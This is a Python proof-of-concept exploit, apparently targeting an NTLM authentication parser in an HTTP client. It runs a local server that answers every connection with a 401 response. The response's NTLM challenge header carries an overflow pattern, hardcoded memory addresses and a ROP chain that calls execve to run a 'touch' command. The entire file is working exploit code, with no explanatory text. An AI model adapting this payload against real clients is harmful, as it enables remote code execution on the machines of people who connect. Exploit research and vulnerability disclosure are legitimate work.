import socket
import base64

ntlm = b"\x4e\x54\x4c\x4d\x53\x53\x50\x00\x02\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x00\x00\x00\x80\x00aaaabaaacaaadaa\x04\xA0\x05aa\x30\x00\x00\x00\x50\xd5\xff\xff\xff\x7f\x00\x00\x21\xda\xff\xff\xff\x7f\x00\x00laaamaaan\x50\xd5\xff\xff\xff\x7f\x00\x00\aaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadtouch REQUIRESEC\x00aadkaadlaadmaadtouch REQUIRESEC\x00aadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaah\x00\x00\x00\x00\x00\x00\x00\x00xaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaitouch REQUIRESEC\x00aaixaaiabcdabbctouch REQUIRESEC\x00aajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraak\x56\xd5\xef\xf7\xff\x7f\x00\x00\x80\x6d\xff\xff\xff\x7f\x00\x00"


from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x7ffff5863000 # a0e971d42962917d1054da891917230387f2613ff20c74bfd30a02c334280078
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

addr = 0x555557374000

rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += b"touch RE"
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
#rop += rebase_0(0x000000000008f000)
rop += p(addr)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042fe5) # 0x0000000000042fe5: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += b'QUIRESEC'
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
#rop += rebase_0(0x000000000008f008)
rop += p(addr + 8)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042fe5) # 0x0000000000042fe5: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += b"URITY   "
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
# rop += rebase_0(0x000000000008f010)
rop += p(addr + 16)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042fe5) # 0x0000000000042fe5: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
# rop += rebase_0(0x000000000008f018)
rop += p(addr + 24)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000042fe5) # 0x0000000000042fe5: mov qword ptr [rdx], rax; ret; 
rop += rebase_0(0x000000000001fa40) # 0x000000000001fa40: pop rdi; ret; 
#rop += rebase_0(0x000000000008f000)
rop += p(addr)
rop += rebase_0(0x00000000000219e3) # 0x00000000000219e3: pop rsi; ret; 
# rop += rebase_0(0x000000000008f018)
rop += p(addr + 24)
rop += rebase_0(0x00000000000322bc) # 0x00000000000322bc: pop rdx; pop rcx; pop r12; ret; 
# rop += rebase_0(0x000000000008f018)
rop += p(addr + 24)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000434f7) # 0x00000000000434f7: pop rax; ret; 
rop += p(0x000000000000003b)
rop += p(0x7ffff59bcbe1)
rop += p(0x7ffff7aa6410)
ntlm += rop

ntlm += b'aaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaotouch REQUIRES\x00ojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaa'

b = bytearray(ntlm)

for i in range(1, 64):
    b.append(i)

unauthorized_base = """HTTP/1.1 401 Unauthorized
Content-Type: text/html; charset=us-ascii
Content-Length: 0
Server: Microsoft-HTTPAPI/2.0
WWW-Authenticate: NTLM """

unauthorized = unauthorized_base + base64.b64encode(b).decode('utf-8') + "\r\n\r\n"

host = "localhost"
port = 5555

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))

s.listen(5)

# accept connection, send single message
while True:
    sock, addr = s.accept()
    buf = sock.recv(1024)
    print ("len[" + str(len(buf)) + "]" + buf.decode())
    response = unauthorized
    print (response)
    try:
        sock.send(response.encode('utf-8'))
    except BrokenPipeError as e:
        print ("Lost connection {}".format(str(e)))

    print ("==================sent=============")
    # buf = sock.recv(1024)
    # print (buf)
    
sock.close()
